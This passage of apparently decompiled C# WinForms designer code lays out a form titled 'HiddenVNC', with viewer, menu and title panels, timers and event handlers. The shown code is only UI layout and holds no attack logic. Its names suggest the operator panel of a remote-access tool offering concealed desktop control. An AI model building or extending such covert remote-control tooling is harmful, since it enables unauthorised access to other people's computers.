        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(492, 13);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 574;
        this.ButtonMaximized.Click += new System.EventHandler(ButtonMaximized_Click);
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.AutoSize = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(442, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(74, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Hidden VNC";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ImageLogo.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ImageLogo.Image = (System.Drawing.Image)resources.GetObject("ImageLogo.Image");
        this.ImageLogo.Location = new System.Drawing.Point(10, 13);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(59, 50);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 570;
        this.ImageLogo.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 473);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(243, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 265);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(243, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(566, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 265);
        this.PanelRight.TabIndex = 591;
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.Timer2.Enabled = true;
        this.Timer2.Tick += new System.EventHandler(Timer2_Tick);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(600, 508);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "HiddenVNC";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "HiddenVNC";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(HiddenVNC_FormClosing);
        base.Load += new System.EventHandler(HiddenVNC_Load);
        base.Shown += new System.EventHandler(HiddenVNC_Shown);
        this.panelForm.ResumeLayout(false);
        this.panelForm.PerformLayout();
        this.panel1.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.WaitRDP).EndInit();
        this.PanelMune.ResumeLayout(false);
        this.PanelMune.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ViewerBox).EndInit();
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).EndInit();
        base.ResumeLayout(false);
    }
}
